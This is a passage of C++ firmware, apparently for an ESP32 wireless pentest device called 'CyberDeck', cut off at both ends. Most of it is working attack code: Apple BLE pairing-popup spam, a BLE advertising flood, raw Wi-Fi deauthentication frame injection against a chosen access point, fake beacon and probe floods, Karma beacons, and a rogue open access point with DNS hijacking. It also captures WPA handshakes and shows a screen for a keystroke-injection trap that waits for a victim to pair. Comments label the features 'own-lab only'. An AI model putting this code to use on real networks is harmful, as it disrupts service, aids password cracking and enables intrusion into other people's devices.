  if (name[0]) snprintf(bleTab[s].name, sizeof(bleTab[s].name), "%s", name);
}
class ScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override { bleOnAdv(d); }
};
static ScanCB scanCb;
static void bleScanStart(BleKind f) {
  bleFilter = f; bleCount = 0; bleSeen = 0; memset(bleTab, 0, sizeof(bleTab));
  NimBLEScan* s = NimBLEDevice::getScan();
  s->setScanCallbacks(&scanCb, false);
  s->setActiveScan(true);
  s->setInterval(80); s->setWindow(50);
  s->start(0, false, true);
  bleScanning = true;
}
static void bleScanStop() {
  if (!bleScanning) return;
  NimBLEDevice::getScan()->stop();
  bleScanning = false;
}

// ---------------------------------------------------------------------------------------
// BLE_SPAM (Apple proximity-pair popups — own-lab; keeps the phone's GATT link alive)
// ---------------------------------------------------------------------------------------
static bool     bleSpamOn = false;
static uint32_t lastSpam = 0;
static const uint8_t APPLE_MODELS[][2] = {
  {0x0e,0x20},{0x0a,0x20},{0x0c,0x0e},{0x11,0x20},{0x03,0x0a},{0x05,0x0b},{0x06,0x0a},{0x13,0x20}
};
static void bleSpamStart() { if (bleUp) NimBLEDevice::getAdvertising()->stop(); bleSpamOn = true; lastSpam = 0; }
static void bleSpamStop()  { bleSpamOn = false; bleAdvNormal(); }
static void bleSpamTick() {
  if (!bleSpamOn || !bleUp) return;
  uint32_t now = millis();
  if (now - lastSpam < 50) return;
  lastSpam = now;
  const uint8_t* mdl = APPLE_MODELS[random((int)(sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0])))];
  uint8_t p[] = { 0x4C,0x00, 0x07,0x19, 0x07, mdl[0], mdl[1], 0x55,
                  (uint8_t)random(256),(uint8_t)random(256),(uint8_t)random(256),(uint8_t)random(256),
                  0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData ad;
  ad.setManufacturerData(std::string((const char*)p, sizeof(p)));
  adv->setAdvertisementData(ad);
  adv->start();
}

// ---------------------------------------------------------------------------------------
// BLE_JAMMER (best-effort: flood randomised adverts across the 3 primary adv channels as fast as
// the controller allows). NOT a true PHY jammer — real 2.4GHz jamming needs the NRF24 upgrade.
// Own-lab only.
// ---------------------------------------------------------------------------------------
static bool     bleJamOn = false;
static uint32_t jamTx = 0;
static void bleJamStart() { if (bleUp) NimBLEDevice::getAdvertising()->stop(); bleJamOn = true; jamTx = 0; }
static void bleJamStop()  { bleJamOn = false; bleAdvNormal(); }
static void bleJamTick() {
  if (!bleJamOn || !bleUp) return;
  uint8_t p[26];
  for (int i = 0; i < (int)sizeof(p); i++) p[i] = (uint8_t)random(256);
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData ad;
  ad.setManufacturerData(std::string((const char*)p, sizeof(p)));
  adv->setAdvertisementData(ad);
  adv->setMinInterval(0x20); adv->setMaxInterval(0x20);   // 20ms — fastest legal adv
  adv->start();
  jamTx++;
}

// ---------------------------------------------------------------------------------------
// WiFi frame injection (ROLE_WIFI, promiscuous on — OWN-LAB ONLY)
// ---------------------------------------------------------------------------------------
static const char* FAKE_SSIDS[] = {
  "FreeWiFi","Starbucks WiFi","xfinitywifi","ATT-Guest","Airport_Free",
  "CyberDeck-Lab","Pentest-Net","Hotel-Guest","Public-WiFi","Cafe-Net"
};
static const int FAKE_N = sizeof(FAKE_SSIDS) / sizeof(FAKE_SSIDS[0]);
static void randMac(uint8_t* m) { for (int i = 0; i < 6; i++) m[i] = random(256); m[0] = (m[0] & 0xFE) | 0x02; }

static void txDeauthTarget() {
  if (!g_haveTarget) return;
  esp_wifi_set_channel(g_tgtCh ? g_tgtCh : curCh, WIFI_SECOND_CHAN_NONE);
  uint8_t f[26] = { 0xC0,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                    0,0,0,0,0,0, 0,0,0,0,0,0, 0x00,0x00, 0x07,0x00 };
  memcpy(f + 10, g_tgtBssid, 6);
  memcpy(f + 16, g_tgtBssid, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
  f[0] = 0xA0;
  esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
  txTotal += 2;
}
static void txBeaconSsid(const char* ssid, uint8_t ch) {
  uint8_t bssid[6]; randMac(bssid);
  uint8_t f[128]; int n = 0;
  uint8_t hdr[] = { 0x80,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
  memcpy(f + n, hdr, 10); n += 10;
  memcpy(f + n, bssid, 6); n += 6;
  memcpy(f + n, bssid, 6); n += 6;
  f[n++] = 0x00; f[n++] = 0x00;
  memset(f + n, 0, 8); n += 8;
  f[n++] = 0x64; f[n++] = 0x00;
  f[n++] = 0x01; f[n++] = 0x00;
  int sl = strlen(ssid); if (sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl; memcpy(f + n, ssid, sl); n += sl;
  uint8_t rates[] = { 0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c };
  memcpy(f + n, rates, sizeof(rates)); n += sizeof(rates);
  f[n++] = 0x03; f[n++] = 0x01; f[n++] = ch;
  esp_wifi_80211_tx(WIFI_IF_STA, f, n, false);
  txTotal++;
}
static void txBeacon()  { txBeaconSsid(FAKE_SSIDS[beaconIdx], channels[chIdx]); beaconIdx = (beaconIdx + 1) % FAKE_N; }
static void txProbe() {
  uint8_t src[6]; randMac(src);
  const char* ssid = FAKE_SSIDS[random(FAKE_N)];
  uint8_t f[96]; int n = 0;
  uint8_t hdr[] = { 0x40,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
  memcpy(f + n, hdr, 10); n += 10;
  memcpy(f + n, src, 6); n += 6;
  f[n++]=0xFF;f[n++]=0xFF;f[n++]=0xFF;f[n++]=0xFF;f[n++]=0xFF;f[n++]=0xFF;
  f[n++] = 0x00; f[n++] = 0x00;
  int sl = strlen(ssid); if (sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl; memcpy(f + n, ssid, sl); n += sl;
  uint8_t rates[] = { 0x01,0x04,0x82,0x84,0x8b,0x96 };
  memcpy(f + n, rates, sizeof(rates)); n += sizeof(rates);
  esp_wifi_80211_tx(WIFI_IF_STA, f, n, false);
  txTotal++;
}
static void txKarma() {
  if (g_haveTarget && g_tgtSsid[0]) txBeaconSsid(g_tgtSsid, g_tgtCh ? g_tgtCh : channels[chIdx]);
  else                              txBeacon();
}

// ---------------------------------------------------------------------------------------
// Evil Portal (unchanged: open rogue SoftAP + DNS hijack + benign captive notice, captures nothing)
// ---------------------------------------------------------------------------------------
static httpd_handle_t portalHttpd = nullptr;
static esp_netif_t*   apNetif = nullptr;
static volatile bool  portalUp = false;
static volatile int   portalHits = 0;
static TaskHandle_t   portalDnsTask = nullptr;
static const char* PORTAL_SSID = "Free Airport WiFi";
static const char* PORTAL_HTML =
  "<!doctype html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
  "<title>Network Notice</title><style>body{font-family:sans-serif;background:#0a0e12;color:#eee;"
  "text-align:center;padding-top:60px}.c{color:#00e5ff}</style></head><body>"
  "<h2 class=c>CyberDeck Lab AP</h2><p>This is a captive-portal <b>test</b> access point.</p>"
  "<p>Your DNS lookup was intercepted and redirected here.</p>"
  "<p style='color:#888'>No information is collected.</p></body></html>";

static esp_err_t portalGet(httpd_req_t* r) {
  portalHits++;
  httpd_resp_set_type(r, "text/html");
  httpd_resp_send(r, PORTAL_HTML, HTTPD_RESP_USE_STRLEN);
  return ESP_OK;
}
static void portalDnsFn(void*) {
  int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (s < 0) { portalDnsTask = nullptr; vTaskDelete(nullptr); return; }
  struct sockaddr_in a; memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET; a.sin_port = htons(53); a.sin_addr.s_addr = htonl(INADDR_ANY);
  bind(s, (struct sockaddr*)&a, sizeof(a));
  struct timeval tv; tv.tv_sec = 1; tv.tv_usec = 0;
  setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  uint8_t buf[512];
  while (portalUp) {
    struct sockaddr_in cli; socklen_t cl = sizeof(cli);
    int n = recvfrom(s, buf, sizeof(buf), 0, (struct sockaddr*)&cli, &cl);
    if (n < 12) continue;
    buf[2] |= 0x80; buf[3] = 0x80;
    buf[6] = 0; buf[7] = 1;
    buf[8] = buf[9] = buf[10] = buf[11] = 0;
    int len = n;
    uint8_t ans[] = { 0xC0,0x0C, 0,1, 0,1, 0,0,0,0x3C, 0,4, 192,168,4,1 };
    if (len + (int)sizeof(ans) <= (int)sizeof(buf)) { memcpy(buf + len, ans, sizeof(ans)); len += sizeof(ans); }
    sendto(s, buf, len, 0, (struct sockaddr*)&cli, cl);
  }
  close(s);
  portalDnsTask = nullptr;
  vTaskDelete(nullptr);
}
static void portalStart() {
  wifiInitOnce();
  if (!apNetif) apNetif = esp_netif_create_default_wifi_ap();
  esp_wifi_set_mode(WIFI_MODE_AP);
  wifi_config_t ap; memset(&ap, 0, sizeof(ap));
  strncpy((char*)ap.ap.ssid, PORTAL_SSID, sizeof(ap.ap.ssid) - 1);
  ap.ap.ssid_len = strlen(PORTAL_SSID);
  ap.ap.channel = 1; ap.ap.max_connection = 4; ap.ap.authmode = WIFI_AUTH_OPEN;
  esp_wifi_set_config(WIFI_IF_AP, &ap);
  esp_wifi_start();
  portalUp = true; portalHits = 0;
  httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
  hc.lru_purge_enable = true;
  hc.uri_match_fn = httpd_uri_match_wildcard;
  if (httpd_start(&portalHttpd, &hc) == ESP_OK) {
    httpd_uri_t g = { "/*", HTTP_GET, portalGet, nullptr };
    httpd_register_uri_handler(portalHttpd, &g);
  }
  xTaskCreate(portalDnsFn, "pdns", 3072, nullptr, 5, &portalDnsTask);
}
static int portalClients() {
  wifi_sta_list_t list; if (esp_wifi_ap_get_sta_list(&list) == ESP_OK) return list.num;
  return 0;
}
static void portalStop() {
  portalUp = false;
  if (portalHttpd) { httpd_stop(portalHttpd); portalHttpd = nullptr; }
  delay(1100);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_STA);
}

// ---------------------------------------------------------------------------------------
// Aging + sorting
// ---------------------------------------------------------------------------------------
static void ageOut() {
  uint32_t now = millis();
  for (int i = 0; i < AP_MAX; i++)  if (apTab[i].used  && now - apTab[i].lastMs  > FORGET_MS) { apTab[i].used  = false; apCount--;  }
  for (int i = 0; i < CLI_MAX; i++) if (cliTab[i].used && now - cliTab[i].lastMs > FORGET_MS) { cliTab[i].used = false; cliCount--; }
}
static int apSorted(int* idx) {
  int n = 0; for (int i = 0; i < AP_MAX; i++) if (apTab[i].used) idx[n++] = i;
  for (int i = 1; i < n; i++) { int k = idx[i], j = i - 1;
    while (j >= 0 && apTab[idx[j]].rssi < apTab[k].rssi) { idx[j+1] = idx[j]; j--; } idx[j+1] = k; }
  return n;
}
static int cliSorted(int* idx) {
  int n = 0; for (int i = 0; i < CLI_MAX; i++) if (cliTab[i].used) idx[n++] = i;
  for (int i = 1; i < n; i++) { int k = idx[i], j = i - 1;
    uint32_t pk = cliTab[k].lastMs - cliTab[k].firstMs;
    while (j >= 0 && (cliTab[idx[j]].lastMs - cliTab[idx[j]].firstMs) < pk) { idx[j+1] = idx[j]; j--; }
    idx[j+1] = k; }
  return n;
}

static void sendAplist() {
  if (!bleUp || !phoneConnected || !chData) return;
  int idx[AP_MAX], n = apSorted(idx);
  char line[96];
  for (int r = 0; r < n; r++) {
    const Ap& a = apTab[idx[r]];
    snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X\t%u\t%d\t%s\n",
             a.bssid[0], a.bssid[1], a.bssid[2], a.bssid[3], a.bssid[4], a.bssid[5],
             a.ch, a.rssi, (a.flags & FLAG_HIDDEN) ? "" : a.ssid);
    chData->setValue((const uint8_t*)line, strlen(line)); chData->notify();
    delay(35);
  }
  chData->setValue((const uint8_t*)"END\n", 4); chData->notify();
}

// Drain the buffered EAPOL frames to the phone as a complete .pcap, base64-encoded so it rides the
// text DATA channel cleanly. Protocol over DATA: "PCAPB64\n", then base64 lines, then "END\n".
// The pcap is built on the fly: 24-byte global header (LINKTYPE_IEEE802_11 = 105) + per-frame
// 16-byte record headers wrapping each raw 802.11 frame.
static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static char    b64line[200];
static int     b64pos = 0;
static uint8_t b64acc[3];
static int     b64n = 0;
static void b64flush() {
  if (b64pos == 0 || !chData) return;
  b64line[b64pos] = '\n';
  chData->setValue((const uint8_t*)b64line, b64pos + 1); chData->notify(); delay(18);
  b64pos = 0;
}
static void b64emit(char c) { b64line[b64pos++] = c; if (b64pos >= 180) b64flush(); }
static void b64byte(uint8_t b) {
  b64acc[b64n++] = b;
  if (b64n == 3) {
    b64emit(B64[b64acc[0] >> 2]);
    b64emit(B64[((b64acc[0] & 3) << 4) | (b64acc[1] >> 4)]);
    b64emit(B64[((b64acc[1] & 15) << 2) | (b64acc[2] >> 6)]);
    b64emit(B64[b64acc[2] & 63]);
    b64n = 0;
  }
}
static void b64bytes(const uint8_t* d, size_t n) { for (size_t i = 0; i < n; i++) b64byte(d[i]); }
static void b64finish() {
  if (b64n == 1) { b64emit(B64[b64acc[0] >> 2]); b64emit(B64[(b64acc[0] & 3) << 4]); b64emit('='); b64emit('='); }
  else if (b64n == 2) { b64emit(B64[b64acc[0] >> 2]); b64emit(B64[((b64acc[0] & 3) << 4) | (b64acc[1] >> 4)]);
                        b64emit(B64[(b64acc[1] & 15) << 2]); b64emit('='); }
  b64n = 0; b64flush();
}
static void le32(uint8_t* o, uint32_t v) { o[0]=v; o[1]=v>>8; o[2]=v>>16; o[3]=v>>24; }
static void sendPcap() {
  if (!bleUp || !phoneConnected || !chData) return;
  chData->setValue((const uint8_t*)"PCAPB64\n", 8); chData->notify(); delay(30);
  b64pos = 0; b64n = 0;
  uint8_t gh[24];
  le32(gh, 0xA1B2C3D4); gh[4]=2; gh[5]=0; gh[6]=4; gh[7]=0;
  le32(gh+8, 0); le32(gh+12, 0); le32(gh+16, 65535); le32(gh+20, 105);
  b64bytes(gh, 24);
  size_t off = 0; uint32_t base = g_epoch ? g_epoch : (millis() / 1000);
  while (off + 2 <= pcapLen) {
    uint16_t fl = pcapBuf[off] | (pcapBuf[off+1] << 8); off += 2;
    if (off + fl > pcapLen) break;
    uint8_t rh[16]; le32(rh, base); le32(rh+4, (uint32_t)((off % 1000) * 1000)); le32(rh+8, fl); le32(rh+12, fl);
    b64bytes(rh, 16);
    b64bytes(pcapBuf + off, fl);
    off += fl;
  }
  b64finish();
  chData->setValue((const uint8_t*)"END\n", 4); chData->notify();
}

// ---------------------------------------------------------------------------------------
// GPS helper for on-screen coord lines
// ---------------------------------------------------------------------------------------
static void gpsLine(char* b, int n) {
  if (g_gps.fix) snprintf(b, n, "GPS %.5f,%.5f s%u", g_gps.lat, g_gps.lon, g_gps.sats);
  else           snprintf(b, n, "GPS no fix  sats:%u", g_gps.sats);
}

// ---------------------------------------------------------------------------------------
// Per-mode screen composers
// ---------------------------------------------------------------------------------------
static void composePassive() {
  char b[ROW_TEXT_MAX + 1];
  uint32_t now = millis();
  setRow(0, COL_CYAN, "CyberDeck  PASSIVE RECON");
  snprintf(b, sizeof(b), "ch%2u fr%lu cyc%lu AP%d CL%d dx%lu", curCh,
           (unsigned long)framesTotal, (unsigned long)g_cycles, apCount, cliCount,
           (unsigned long)deauthTotal);
  setRow(1, deauthTotal ? COL_RED : COL_GREEN, b);
  setRow(2, COL_YELLOW, "APs  rssi ch enc   ssid");
  int idx[CLI_MAX], n = apSorted(idx);
  for (int r = 0; r < 7; r++) {
    if (r >= n) { setRow(3 + r, COL_GRAY, ""); continue; }
    const Ap& a = apTab[idx[r]];
    snprintf(b, sizeof(b), "%4d %2u %-5s %s", a.rssi, a.ch, encShort(a.enc),
             (a.flags & FLAG_HIDDEN) ? "<hidden>" : a.ssid);
    uint8_t col = a.enc == ENC_OPEN ? COL_RED : (a.enc == ENC_WEP ? COL_ORANGE : COL_GREEN);
    setRow(3 + r, col, b);
  }
  setRow(10, COL_YELLOW, "CLIENTS rssi seen mac ->/probe");
  n = cliSorted(idx);
  for (int r = 0; r < 9; r++) {
    if (r >= n) { setRow(11 + r, COL_GRAY, ""); continue; }
    const Cli& c = cliTab[idx[r]];
    uint32_t secs = (c.lastMs - c.firstMs) / 1000;
    char tail[20];
    if (c.probeLen)    snprintf(tail, sizeof(tail), "?%s", c.probe);
    else if (c.haveAp) snprintf(tail, sizeof(tail), ">%02x%02x%02x", c.ap[3], c.ap[4], c.ap[5]);
    else               tail[0] = 0;
    snprintf(b, sizeof(b), "%4d %3lus %02x%02x%02x%s %s", c.rssi, (unsigned long)secs,
             c.mac[3], c.mac[4], c.mac[5], (c.flags & FLAG_RANDOM) ? "~" : "", tail);
    uint8_t col = (now - c.lastMs > 20000) ? COL_GRAY : (secs > 60 ? COL_ORANGE : COL_GREEN);
    setRow(11 + r, col, b);
  }
  forceAll = false;
}

static void composeIdle() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  SPECTRE HUB");
  setRow(1, COL_GREEN, "IDLE - radio free for BLE");
  snprintf(b, sizeof(b), "BLE: %s", phoneConnected ? "phone CONNECTED" : "advertising...");
  setRow(3, phoneConnected ? COL_GREEN : COL_YELLOW, b);
  setRow(4, COL_GRAY, "app: pick a mode");
  gpsLine(b, sizeof(b)); setRow(6, g_gps.fix ? COL_GREEN : COL_GRAY, b);
  snprintf(b, sizeof(b), "uptime %lus", (unsigned long)(millis() / 1000));
  setRow(8, COL_GREEN, b);
  forceAll = false;
}

static void composeStub() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  SPECTRE HUB");
  snprintf(b, sizeof(b), "MODE: %s", MODE_NAME[currentMode]);
  setRow(1, isTxMode(currentMode) ? COL_RED : COL_YELLOW, b);
  snprintf(b, sizeof(b), "BLE %s  uptime %lus",
           bleUp ? (phoneConnected ? "conn" : "adv") : "off",
           (unsigned long)(millis() / 1000));
  setRow(3, COL_GREEN, b);
  forceAll = false;
}

static void composeHid() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  BLE HID TRAP");
  snprintf(b, sizeof(b), "bait: %s", HID_BAIT_NAME);
  setRow(1, COL_RED, b);
  snprintf(b, sizeof(b), "script: %s", duckyName(g_duckyScript));
  setRow(3, COL_YELLOW, b);
  const char* st = g_duckyState == 0 ? "waiting for victim..."
                 : g_duckyState == 1 ? "paired - arming..."
                 : g_duckyState == 2 ? "RUNNING SCRIPT" : "DONE";
  setRow(5, g_duckyState >= 1 ? COL_GREEN : COL_GRAY, st);
  setRow(7, COL_GRAY, "STOP (app) to exit");
  forceAll = false;
}

static void composeWifiScan() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  WIFI SCAN");
  snprintf(b, sizeof(b), "ch%2u APs:%d frames:%lu", curCh, apCount, (unsigned long)framesTotal);
  setRow(1, COL_GREEN, b);
  setRow(2, COL_YELLOW, "rssi ch enc  vend  ssid");
  int idx[AP_MAX], n = apSorted(idx);
  for (int r = 0; r < 16; r++) {
    if (r >= n) { setRow(3 + r, COL_GRAY, ""); continue; }
    const Ap& a = apTab[idx[r]];
    const char* ven = ouiVendor(a.bssid);
    snprintf(b, sizeof(b), "%4d %2u %-5s %-5s %s", a.rssi, a.ch, encShort(a.enc), ven,
             (a.flags & FLAG_HIDDEN) ? "<hidden>" : a.ssid);
    uint8_t col = a.enc == ENC_OPEN ? COL_RED : (a.enc == ENC_WEP ? COL_ORANGE : COL_GREEN);
    setRow(3 + r, col, b);
  }
  forceAll = false;
}

static const char* bleKindTag(uint8_t k) {
  switch (k) { case BK_AIRTAG: return "AirTag"; case BK_FLIPPER: return "Flipper";
               case BK_SKIMMER: return "Skimmer"; default: return "dev"; }
}
static void composeBleList() {
  char b[ROW_TEXT_MAX + 1];
  const char* t = currentMode == AIRTAG_SCAN ? "AIRTAG SCAN"
                : currentMode == FLIPPER_SCAN ? "FLIPPER SCAN"
                : currentMode == SKIMMER_SCAN ? "SKIMMER SCAN" : "BLE SCAN";
  snprintf(b, sizeof(b), "CyberDeck  %s", t);
  setRow(0, COL_CYAN, b);
  snprintf(b, sizeof(b), "adv:%lu shown:%d phone:%s", (unsigned long)bleSeen, bleCount,
           phoneConnected ? "conn" : "adv");
  setRow(1, COL_GREEN, b);
  setRow(2, COL_YELLOW, "rssi kind     name/addr");
  int idx[BLE_MAX], n = 0;
  for (int i = 0; i < BLE_MAX; i++) if (bleTab[i].used) idx[n++] = i;
  for (int i = 1; i < n; i++) { int k = idx[i], j = i - 1;
    while (j >= 0 && bleTab[idx[j]].rssi < bleTab[k].rssi) { idx[j+1] = idx[j]; j--; } idx[j+1] = k; }
  for (int r = 0; r < 17; r++) {
    if (r >= n) { setRow(3 + r, COL_GRAY, ""); continue; }
    const BleDev& d = bleTab[idx[r]];
    snprintf(b, sizeof(b), "%4d %-7s %s", d.rssi, bleKindTag(d.kind), d.name[0] ? d.name : d.key);
    setRow(3 + r, d.kind == BK_PLAIN ? COL_GREEN : COL_RED, b);
  }
  forceAll = false;
}

static void composeBleSniffer() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  BLE SNIFFER");
  snprintf(b, sizeof(b), "tracked:%d adv:%lu", bleCount, (unsigned long)bleSeen);
  setRow(1, COL_GREEN, b);
  setRow(2, COL_YELLOW, "rssi pkts age  name/addr");
  int idx[BLE_MAX], n = 0;
  for (int i = 0; i < BLE_MAX; i++) if (bleTab[i].used) idx[n++] = i;
  // sort by packet count (busiest first)
  for (int i = 1; i < n; i++) { int k = idx[i], j = i - 1;
    while (j >= 0 && bleTab[idx[j]].pkts < bleTab[k].pkts) { idx[j+1] = idx[j]; j--; } idx[j+1] = k; }
  uint32_t now = millis();
  for (int r = 0; r < 17; r++) {
    if (r >= n) { setRow(3 + r, COL_GRAY, ""); continue; }
    const BleDev& d = bleTab[idx[r]];
    uint32_t age = (now - d.lastMs) / 1000;
    snprintf(b, sizeof(b), "%4d %4u %3lus %s", d.rssi, d.pkts, (unsigned long)age,
             d.name[0] ? d.name : d.key);
    setRow(3 + r, d.kind == BK_PLAIN ? COL_GREEN : COL_RED, b);
  }
  forceAll = false;
}

static void composeBleJam() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  BLE JAMMER");
  setRow(1, COL_RED, "** TX: adv flood (own-lab) **");
  setRow(3, COL_YELLOW, "best-effort, not true jam");
  setRow(4, COL_GRAY, "real jam needs NRF24 (future)");
  snprintf(b, sizeof(b), "adv bursts tx:%lu", (unsigned long)jamTx);
  setRow(6, COL_GREEN, b);
  setRow(8, COL_GRAY, "STOP (app) to exit");
  forceAll = false;
}

static void tgtLine(char* b, int n) {
  snprintf(b, n, "tgt %02X%02X%02X%02X%02X%02X ch%u",
    g_tgtBssid[0], g_tgtBssid[1], g_tgtBssid[2], g_tgtBssid[3], g_tgtBssid[4], g_tgtBssid[5], g_tgtCh);
}
static void composeTxAttack() {
  char b[ROW_TEXT_MAX + 1];
  snprintf(b, sizeof(b), "CyberDeck  %s", MODE_NAME[currentMode]);
  setRow(0, COL_CYAN, b);
  if (currentMode == WIFI_DEAUTH && !g_haveTarget) {
    setRow(1, COL_RED, "NO TARGET - NOT transmitting");
    setRow(3, COL_YELLOW, "pick a target in the app");
    setRow(5, COL_GRAY, "STOP (app) to exit");
    forceAll = false; return;
  }
  setRow(1, COL_RED, "** TX ACTIVE (own-lab) **");
  if (g_haveTarget && (currentMode == WIFI_DEAUTH || currentMode == KARMA)) {
    tgtLine(b, sizeof(b)); setRow(2, COL_GREEN, b);
    if (g_tgtSsid[0]) { snprintf(b, sizeof(b), "\"%s\"", g_tgtSsid); setRow(3, COL_GREEN, b); }
  }
  snprintf(b, sizeof(b), "ch%2u frames tx:%lu", curCh, (unsigned long)txTotal);
  setRow(5, COL_YELLOW, b);
  setRow(7, COL_GRAY, "STOP (app) to exit");
  forceAll = false;
}

static void composeHandshake() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  HANDSHAKE CAP");
  if (g_haveTarget) { tgtLine(b, sizeof(b)); setRow(1, COL_GREEN, b); }
  else                setRow(1, COL_YELLOW, "no target: listening all ch");
  snprintf(b, sizeof(b), "EAPOL:%lu frames:%u ch%2u", (unsigned long)eapolCount, pcapFrames, curCh);
  setRow(3, eapolCount ? COL_GREEN : COL_YELLOW, b);
  if (eapolHave) {
    snprintf(b, sizeof(b), "last %02x%02x%02x%02x%02x%02x",
             eapolBssid[0], eapolBssid[1], eapolBssid[2], eapolBssid[3], eapolBssid[4], eapolBssid[5]);
    setRow(5, COL_GREEN, b);
  } else setRow(5, COL_GRAY, g_haveTarget ? "forcing reauth (deauth)..." : "deauth a client to force");
  snprintf(b, sizeof(b), "buffered %u B -> pull in app", (unsigned)pcapLen);
  setRow(7, pcapLen ? COL_GREEN : COL_GRAY, b);
  setRow(9, COL_GRAY, "STOP (app) to exit");
  forceAll = false;
}

static void composeTargetScan() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  TARGET SCAN");
  snprintf(b, sizeof(b), "scanning ch%2u  APs:%d", curCh, apCount);
  setRow(1, COL_YELLOW, b);
  setRow(3, COL_GRAY, "collecting networks ~8s...");
  setRow(5, COL_GRAY, "app reconnects + lists them");
  forceAll = false;
}

static void composePortal() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  EVIL PORTAL");
  snprintf(b, sizeof(b), "SSID: %s", PORTAL_SSID);
  setRow(1, COL_RED, b);
  snprintf(b, sizeof(b), "clients:%d page hits:%d", portalClients(), portalHits);
  setRow(3, COL_GREEN, b);
  setRow(5, COL_GRAY, "open AP + DNS redirect (test)");
  setRow(6, COL_GRAY, "serves notice page only");
  setRow(8, COL_GRAY, "STOP (app) to exit");
  forceAll = false;
}

static void composeBleSpam() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  BLE SPAM");
  setRow(1, COL_RED, "** TX: BLE pairing popups **");
  setRow(3, COL_YELLOW, "phone link stays connected");
  snprintf(b, sizeof(b), "uptime %lus", (unsigned long)(millis() / 1000));
  setRow(5, COL_GREEN, b);
  setRow(7, COL_GRAY, "STOP (app) to exit");
  forceAll = false;
}

static void composeWardrive() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  WARDRIVE");
  gpsLine(b, sizeof(b)); setRow(1, g_gps.fix ? COL_GREEN : COL_YELLOW, b);
  snprintf(b, sizeof(b), "ch%2u APs:%d  (live, on-screen)", curCh, apCount);
  setRow(2, COL_YELLOW, b);
  int idx[AP_MAX], n = apSorted(idx);
  for (int r = 0; r < 16; r++) {
    if (r >= n) { setRow(3 + r, COL_GRAY, ""); continue; }
    const Ap& a = apTab[idx[r]];
    snprintf(b, sizeof(b), "%4d %2u %-5s %s", a.rssi, a.ch, encShort(a.enc),
             (a.flags & FLAG_HIDDEN) ? "<hidden>" : a.ssid);
    uint8_t col = a.enc == ENC_OPEN ? COL_RED : (a.enc == ENC_WEP ? COL_ORANGE : COL_GREEN);
    setRow(3 + r, col, b);
  }
  forceAll = false;
}

static void composePacketMonitor() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  PACKET MONITOR");
  snprintf(b, sizeof(b), "ch%2u total:%lu mgmt:%lu dx:%lu", curCh,
           (unsigned long)framesTotal, (unsigned long)mgmtTotal, (unsigned long)deauthTotal);
  setRow(1, deauthTotal ? COL_RED : COL_GREEN, b);
  setRow(2, COL_YELLOW, "ch  frames   bar");
  uint32_t mx = 1;
  for (int i = 0; i < 13; i++) if (chFrames[i] > mx) mx = chFrames[i];
  for (int i = 0; i < 13; i++) {
    int bars = (int)((chFrames[i] * 20) / mx);
    char g[21]; for (int j = 0; j < 20; j++) g[j] = j < bars ? '#' : ' '; g[20] = 0;
    snprintf(b, sizeof(b), "%2d %6lu %s", i + 1, (unsigned long)chFrames[i], g);
    setRow(3 + i, (i + 1 == curCh) ? COL_CYAN : COL_GREEN, b);
  }
  forceAll = false;
}

static void composeSatellite() {
  char b[ROW_TEXT_MAX + 1];
  setRow(0, COL_CYAN, "CyberDeck  SATELLITE SCAN");
  if (g_gps.fix) snprintf(b, sizeof(b), "FIX q%u sats%u hdop%.1f", g_gps.fixq, g_gps.sats, g_gps.hdop);
  else           snprintf(b, sizeof(b), "NO FIX  in-view:%d", g_satCount);
  setRow(1, g_gps.fix ? COL_GREEN : COL_YELLOW, b);
  if (g_gps.fix) { snprintf(b, sizeof(b), "%.5f, %.5f", g_gps.lat, g_gps.lon); setRow(2, COL_GREEN, b); }
  else           setRow(2, COL_GRAY, "waiting for position...");
  setRow(3, COL_YELLOW, "prn  snr  bar");
  for (int r = 0; r < 16; r++) {
    if (r >= g_satCount) { setRow(4 + r, COL_GRAY, ""); continue; }
    const SatView& s = g_sat[r];
    int bars = s.snr > 50 ? 20 : (s.snr * 20) / 50;
    char g[21]; for (int j = 0; j < 20; j++) g[j] = j < bars ? '#' : ' '; g[20] = 0;
